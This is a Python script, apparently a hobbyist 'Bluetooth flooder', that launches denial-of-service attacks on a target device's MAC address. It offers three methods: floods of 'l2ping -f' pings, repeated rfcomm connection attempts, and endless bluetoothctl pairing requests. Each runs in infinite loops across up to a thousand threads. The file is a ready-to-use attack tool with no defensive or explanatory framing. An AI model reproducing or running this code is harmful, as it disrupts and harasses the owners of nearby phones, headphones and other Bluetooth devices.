#hi
import os
import sys
import subprocess
import time
import threading
def run_cmd(command: str):
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        #return stdout.decode("utf-8")
def run_cmd_out(command: str):
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        return stdout.decode("utf-8")
print("___.    __  .__      _____.__                    .___            \n\\_ |___/  |_|  |   _/ ____\\  |   ____   ____   __| _/___________ \n | __ \\   __\\  |   \\   __\\|  |  /  _ \\ /  _ \\ / __ |/ __ \\_  __ \\\n | \\_\\ \\  | |  |__  |  |  |  |_(  <_> |  <_> ) /_/ \\  ___/|  | \\/\n |___  /__| |____/  |__|  |____/\\____/ \\____/\\____ |\\___  >__|   \n     \\/                                           \\/    \\/       ")
print("widow9098#0353")
try: cmd = sys.argv[1]
except: cmd = ""
if (cmd == "on"):
    print("hci0 up")
    hwus = run_cmd("hciconfig hci0 up")
elif (cmd == "off"):
    print("hci0 down")
    hwus = run_cmd("hciconfig hci0 down")
elif (cmd == "scan"):
    print(run_cmd_out("hcitool scan"))
elif (len(sys.argv) != 4):
    print("methods: pair/l2ping")
    print("utils: scan/on/off")
    print(sys.argv[0] + " <pair/l2ping/rfcomm> <mac> <threads(recomended:1000)>")
    print(sys.argv[0] + " <scan/on/off>")    
else:
    method = sys.argv[1]
    macadd = sys.argv[2]
    threadnum = str(sys.argv[3])
    threadnums = int(sys.argv[3])
    if (method == "rfcomm"):
        def loopbacklrfcomm():
            while True: 
                hwus = run_cmd("rfcomm connect %s 1" % (macadd)) 
                print("sent packet to " + macadd + " size:700")
        print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
        for i in range(threadnums):
            threading.Thread(target = loopbacklrfcomm).start()
    elif (method == "l2ping"):
        def loopbacklping():
            while True: 
                hwus = run_cmd("sudo l2ping -i %s -s %s -f %s &" % ("hci0", 600, macadd)) 
                print("sent packet to " + macadd + " size:700")
        print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
        for i in range(threadnums):
            threading.Thread(target = loopbacklping).start()
    elif (method == "pair"):
        def loopback():
            packetsent = 0
            while True:
                run_cmd("bluetoothctl power on") 
                run_cmd("bluetoothctl discoverable on") 
                run_cmd("bluetoothctl pairable on") 
                run_cmd("bluetoothctl agent on") 
                run_cmd("bluetoothctl default-agent") 
                run_cmd("timeout 1s bluetoothctl scan on")  
                run_cmd("timeout 2s bluetoothctl pair " + macadd) 
                os.system("clear")
                print("sent pair packet to " + macadd)
                print("sent " + str(packetsent) + " packets")
        print("running " + method + " attack on " + macadd)
        threading.Thread(target = loopback).start()
    else:
        print("u fucked up the cmd") 
